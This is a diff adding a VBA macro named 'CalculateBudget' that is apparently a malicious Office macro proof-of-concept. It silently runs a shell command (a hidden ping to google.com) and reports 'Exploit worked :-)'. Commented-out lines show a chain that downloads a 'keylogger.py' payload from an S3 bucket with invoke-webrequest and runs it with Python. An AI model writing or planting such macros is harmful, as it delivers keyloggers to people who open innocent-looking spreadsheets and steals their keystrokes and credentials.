@@ -1,0 +1,36 @@
+Sub CalculateBudget()
+
+    Url = "google.com"
+        
+    Dim shell
+    Set shell = CreateObject("wscript.shell")
+    result = shell.Run("ping " & Url, 0, True)
+
+'Download Python Script
+'strCommand = "invoke-webrequest -Uri "https://pub6075.s3.ap-southeast-#1.amazonaws.com/payload/keylogger.py" -OutFile "C:\keylogger.py" -UseDefaultCredentials
+'Set WsShell = CreateObject("WScript.Shell")
+'WsShell.Run (strCommand)
+
+'Declare Variables
+'Dim objShell As Object
+'Dim PythonExe, PythonScript As String
+
+' Object shell.
+'Set objShell = VBA.CreateObject("Wscript.Shell")
+
+' Define path to python exe and script
+'PythonExe = """C:\Program Files (x86)\Microsoft Visual Studio\Shared\Python36_64\python.exe"""
+'PythonScriptLoad = "C:\loader.py"
+'PythonScriptRun = "C:\keylogger.py"
+
+'Run the Python Script
+'objShell.Run PythonExe & PythonScript
+
+    If result = 0 Then
+        MsgBox "Contacted " & Url & ". Exploit worked :-)"
+    End If
+
+End Sub
+
+
+
